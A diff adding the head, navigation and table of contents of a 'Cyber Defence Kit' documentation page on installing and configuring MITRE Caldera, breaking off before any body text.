@@ -1,0 +1,2951 @@
+<!DOCTYPE html><html lang="en" class="no-js"><head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../auroralite/auroralite.html">
+      
+      
+        <link rel="next" href="../navigator/navigator.html">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../images/Cyber Defence Kit logo.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
+    
+    
+      
+        <title>Caldera - Cyber Defence Kit</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+        <script src="https://unpkg.com/iframe-worker/shim"></script>
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  <link href="../assets/stylesheets/glightbox.min.css" rel="stylesheet"><script src="../assets/javascripts/glightbox.min.js"></script><style id="glightbox-style">
+            html.glightbox-open { overflow: initial; height: 100%; }
+            .gslide-title { margin-top: 0px; user-select: text; }
+            .gslide-desc { color: #666; user-select: text; }
+            .gslide-image img { background: white; }
+            .gscrollbar-fixer { padding-right: 15px; }
+            .gdesc-inner { font-size: 0.75rem; }
+            body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color); }
+            body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color); }
+            body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color); }
+        </style></head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="light-blue">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#caldera" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../index.html" title="Cyber Defence Kit" class="md-header__button md-logo" aria-label="Cyber Defence Kit" data-md-component="logo">
+      
+  <img src="../images/Cyber Defence Kit logo.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Cyber Defence Kit
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Caldera
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="light-blue" aria-label="Switch to dark mode" type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"></path></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="light-blue" aria-label="Switch to light mode" type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"></path></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"></path></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../index.html" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../understanding-SIEM/understanding-SIEM.html" class="md-tabs__link">
+          
+  
+  
+    
+  
+  SIEM
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../understanding-IDS-IPS/understanding-IDS-IPS.html" class="md-tabs__link">
+          
+  
+  
+    
+  
+  IDS/IPS
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../understanding-SIRP/understanding-SIRP.html" class="md-tabs__link">
+          
+  
+  
+    
+  
+  SIRP
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../understanding-SOAR/understanding-SOAR.html" class="md-tabs__link">
+          
+  
+  
+    
+  
+  SOAR
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../understanding-NTA/understanding-NTA.html" class="md-tabs__link">
+          
+  
+  
+    
+  
+  NTA
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../understanding-DFIR/understanding-DFIR.html" class="md-tabs__link">
+          
+  
+  
+    
+  
+  DFIR
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../understanding-EDR/understanding-EDR.html" class="md-tabs__link">
+          
+  
+  
+    
+  
+  EDR
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="caldera.html" class="md-tabs__link">
+          
+  
+  
+    
+  
+  MITRE
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../index.html" title="Cyber Defence Kit" class="md-nav__button md-logo" aria-label="Cyber Defence Kit" data-md-component="logo">
+      
+  <img src="../images/Cyber Defence Kit logo.png" alt="logo">
+
+    </a>
+    Cyber Defence Kit
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../index.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2">
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SIEM
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    SIEM
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../understanding-SIEM/understanding-SIEM.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Understanding SIEM
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../splunk/splunk.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Splunk
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../wazuh/wazuh.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Wazuh
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../securityonion/securityonion.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Security Onion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3">
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IDS/IPS
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    IDS/IPS
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../understanding-IDS-IPS/understanding-IDS-IPS.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Understanding IDS/IPS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../snort/snort.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Snort
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../suricata/suricata.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Suricata
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4">
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SIRP
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    SIRP
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../understanding-SIRP/understanding-SIRP.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Understanding SIRP
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../thehive/thehive.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TheHive
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../iris/iris.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IRIS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5">
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SOAR
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    SOAR
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../understanding-SOAR/understanding-SOAR.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Understanding SOAR
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../shuffle/shuffle.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Shuffle
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6">
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NTA
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    NTA
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../understanding-NTA/understanding-NTA.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Understanding NTA
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../wireshark/wireshark.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Wireshark
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zeek/zeek.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Zeek
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zui/zui.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Zui
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_7">
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DFIR
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    DFIR
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../understanding-DFIR/understanding-DFIR.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Understanding DFIR
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../velociraptor/velociraptor.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Velociraptor
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_8">
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    EDR
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    EDR
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../understanding-EDR/understanding-EDR.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Understanding EDR
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../auroralite/auroralite.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Aurora Lite
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MITRE
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_9">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    MITRE
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Caldera
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="caldera.html" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Caldera
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+  
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#lab-setup-for-proof-of-concept" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lab Setup for Proof of Concept
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#installing-caldera" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Installing Caldera
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Installing Caldera">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#system-requirements" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        System Requirements
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#recommended-setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Recommended Setup
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#installing-caldera-offline-ubuntu" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Installing Caldera Offline (Ubuntu)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Installing Caldera Offline (Ubuntu)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#on-an-internet-connected-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        On an Internet-Connected Machine
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#on-the-air-gapped-environment" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        On the Air-Gapped Environment
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#running-caldera" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Running Caldera
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#installing-caldera-online" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Installing Caldera Online
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Installing Caldera Online">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#quick-installation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Quick Installation
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-by-step-installation-guide" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step-by-Step Installation Guide
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#docker-deployment" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Docker Deployment
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#introduction-to-caldera" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Introduction to Caldera
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Introduction to Caldera">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#configuring-abilities" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Configuring Abilities
+      
+    </span>
+  </a>
+  
+</li>
+        
